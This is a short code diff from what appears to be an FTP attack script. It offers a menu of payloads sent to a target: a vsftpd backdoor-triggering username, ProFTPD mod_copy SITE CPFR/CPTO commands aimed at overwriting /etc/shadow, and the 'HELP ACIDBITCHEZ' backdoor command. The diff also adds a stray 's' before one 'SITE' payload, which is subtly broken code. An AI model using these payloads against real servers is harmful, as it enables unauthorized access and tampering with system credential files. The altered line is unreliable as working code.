@@ -87,10 +87,10 @@ def perform_ftp_attack():
     choice = input("Enter the number of the attack to perform: ")
 
     if choice == "1":
-        payload = "USER anonymous:)\nPASS somepassword\n"
+        payload = b'USER anonymous:)\nPASS somepassword\n'
         return exploit_ftp(fsIP, payload)
     elif choice == "2":
-        payload = "SITE CPFR /proc/self/cmdline\nSITE CPTO /tmp/cmdline\nSITE CPFR /tmp/cmdline\nSITE CPTO /etc/shadow\n"
+        payload = "sSITE CPFR /proc/self/cmdline\nSITE CPTO /tmp/cmdline\nSITE CPFR /tmp/cmdline\nSITE CPTO /etc/shadow\n"
         return exploit_ftp(fsIP, payload)
     elif choice == "3":
         payload = "HELP ACIDBITCHEZ\n"
